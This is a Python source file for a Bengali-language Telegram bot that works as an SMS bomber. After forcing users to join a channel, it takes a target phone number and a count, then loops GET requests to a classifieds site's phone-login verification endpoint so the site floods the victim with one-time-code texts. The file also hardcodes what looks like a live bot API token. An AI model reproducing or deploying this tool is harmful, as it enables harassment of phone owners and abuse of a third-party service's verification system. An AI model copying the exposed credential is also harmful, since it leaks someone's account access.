import telebot
import requests
import time
from telebot import types

# ১. সেটিংস ও টোকেন
API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
CHANNEL_USERNAME = '@developer_of_maruf' 
AD_TEXT = "\n\n🚀 Join our channel for more updates!"

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# মেম্বারশিপ চেক করার ফাংশন
def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except Exception:
        return False

# ২. /start কমান্ড
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    
    if check_join(chat_id):
        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:" + AD_TEXT)
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        btn_join = types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf")
        btn_done = types.InlineKeyboardButton("🔄 Verify / Done", callback_data="verify")
        markup.add(btn_join)
        markup.add(btn_done)
        
        bot.send_message(chat_id, "❌ আপনি এখনো আমাদের চ্যানেলে জয়েন করেননি!\n\nবোটটি ব্যবহার করতে প্রথমে জয়েন করুন, তারপর ভেরিফাই ক্লিক করুন।", reply_markup=markup)

# ৩. ভেরিফাই বাটন হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    chat_id = call.message.chat.id
    if check_join(chat_id):
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:" + AD_TEXT)
        bot.register_next_step_handler(msg, get_number)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি আমাদের চ্যানেলে জয়েন হননি! বোটটি ব্যবহার করতে অবশ্যই আমাদের চ্যানেলে জয়েন হতে হবে।", show_alert=True)

# ৪. নাম্বার ইনপুট নেওয়া
def get_number(message):
    number = message.text
    if not number or not number.isdigit() or len(number) < 11:
        msg = bot.reply_to(message, "❌ ভুল নাম্বার! সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
        
    user_data[message.chat.id] = {'number': number}
    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান (Amount) লিখুন:" + AD_TEXT)
    bot.register_next_step_handler(msg, get_amount)

# ৫. এমাউন্ট নিয়ে SMS পাঠানো
def get_amount(message):
    try:
        amount = int(message.text)
        chat_id = message.chat.id
        number = user_data[chat_id]['number']
        
        bot.send_message(chat_id, f"🚀 {number} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে..." + AD_TEXT)

        api = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"

        for i in range(amount):
            requests.get(api, timeout=5)

        bot.send_message(chat_id, f"✅ অভিনন্দন! সফলভাবে {amount}টি SMS পাঠানো হয়েছে।\n\nআবার নতুন করে পাঠাতে /start লিখুন।" + AD_TEXT)
        
    except Exception as e:
        msg = bot.reply_to(message, "⚠️ ভুল হয়েছে! শুধু সংখ্যা লিখুন (যেমন: ১০):")
        bot.register_next_step_handler(msg, get_amount)

# বোট সচল রাখার লুপ
if __name__ == "__main__":
    print("বোট সচল আছে...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            time.sleep(5)
